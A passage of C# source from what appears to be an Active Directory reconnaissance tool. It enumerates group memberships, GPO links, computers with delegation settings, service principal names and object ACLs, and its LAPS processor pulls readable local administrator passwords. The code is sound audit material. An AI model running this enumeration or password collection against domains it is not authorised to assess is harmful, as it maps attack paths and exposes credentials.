                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = "trust";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdOU = (SearchResult) record;

                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Properties["name"][0]));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", (AdOU.Properties["description"].Count != 0 ? AdOU.Properties["description"][0] : "")));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Properties["whencreated"][0]));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Properties["whenchanged"][0]));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Properties["distinguishedname"][0]));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Properties["displayname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Properties["name"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Properties["whenCreated"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Properties["whenChanged"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Properties["distinguishedname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Properties["gpcfilesyspath"][0]));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;
                    LDAPClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Properties["distinguishedname"][0]).ToUpper()), (Convert.ToString(AdGPO.Properties["displayname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSOM = (SearchResult) record;

                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = (AdSOM.Properties["gPLink"].Count != 0 ? Convert.ToString(AdSOM.Properties["gPLink"][0]) : "");
                    string GPOName = null;

                    Depth = ((Convert.ToString(AdSOM.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1);
                    if (AdSOM.Properties["gPOptions"].Count != 0)
                    {
                        if ((int) AdSOM.Properties["gPOptions"][0] == 1)
                        {
                            BlockInheritance = true;
                        }
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = LDAPClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? LDAPClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdPrinter = (SearchResult) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Properties["Name"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Properties["serverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", AdPrinter.Properties["printShareName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Properties["driverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Properties["driverVersion"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", AdPrinter.Properties["portName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", AdPrinter.Properties["url"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Properties["whenCreated"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Properties["whenChanged"][0]));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool Dormant = false;
                    bool? Enabled = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    string StrIPAddress = null;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Properties["dnshostname"].Count != 0)
                    {
                        try
                        {
                            StrIPAddress = Convert.ToString(Dns.GetHostEntry(Convert.ToString(AdComputer.Properties["dnshostname"][0])).AddressList[0]);
                        }
                        catch
                        {
                            StrIPAddress = null;
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdComputer.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                    }
                    if (AdComputer.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Properties["pwdlastset"].Count != 0)
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Properties["pwdlastset"][0]));
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) TrustedforDelegation) && ((int) AdComputer.Properties["primarygroupid"][0] == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                    {
                        DelegationType = "Constrained";
                        for (int i = 0; i < AdComputer.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                        {
                            var delegateto = AdComputer.Properties["msDS-AllowedToDelegateTo"][i];
                            DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(',');
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    string SIDHistory = "";
                    if (AdComputer.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdComputer.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdComputer.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    string OperatingSystem = CleanString((AdComputer.Properties["operatingsystem"].Count != 0 ? AdComputer.Properties["operatingsystem"][0] : "-") + " " + (AdComputer.Properties["operatingsystemhotfix"].Count != 0 ? AdComputer.Properties["operatingsystemhotfix"][0] : " ") + " " + (AdComputer.Properties["operatingsystemservicepack"].Count != 0 ? AdComputer.Properties["operatingsystemservicepack"][0] : " ") + " " + (AdComputer.Properties["operatingsystemversion"].Count != 0 ? AdComputer.Properties["operatingsystemversion"][0] : " "));

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? CleanString(AdComputer.Properties["samaccountname"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? CleanString(AdComputer.Properties["name"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", StrIPAddress));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", (AdComputer.Properties["primarygroupid"].Count != 0 ? AdComputer.Properties["primarygroupid"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["objectSID"][0], 0))));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", (AdComputer.Properties["Description"].Count != 0 ? CleanString(AdComputer.Properties["Description"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", (AdComputer.Properties["ms-ds-CreatorSid"].Count != 0 ? Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["ms-ds-CreatorSid"][0], 0)) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdComputer.Properties["useraccountcontrol"].Count != 0 ? AdComputer.Properties["useraccountcontrol"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Properties["whencreated"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Properties["whenchanged"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Properties["distinguishedname"][0]));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    if (AdComputer.Properties["serviceprincipalname"].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in AdComputer.Properties["serviceprincipalname"])
                    {
                        string[] SPNArray = SPN.Split('/');
                        bool flag = true;
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? CleanString(AdComputer.Properties["samaccountname"][0]) : "")));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? CleanString(AdComputer.Properties["name"][0]) : "")));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count != 0)
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Properties["ms-mcs-admpwdexpirationtime"][0]));
                        PasswordStored = true;
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : AdComputer.Properties["cn"][0] )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? AdComputer.Properties["ms-mcs-admpwd"][0] : null)));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            LDAPClass.AdSIDDictionary.Add(Convert.ToString(new SecurityIdentifier((byte[])AdObject.Properties["objectSID"][0], 0)), (Convert.ToString(AdObject.Properties["name"][0])));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", LDAPClass.AdSIDDictionary.ContainsKey(Owner) ? LDAPClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Properties["distinguishedname"][0]));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
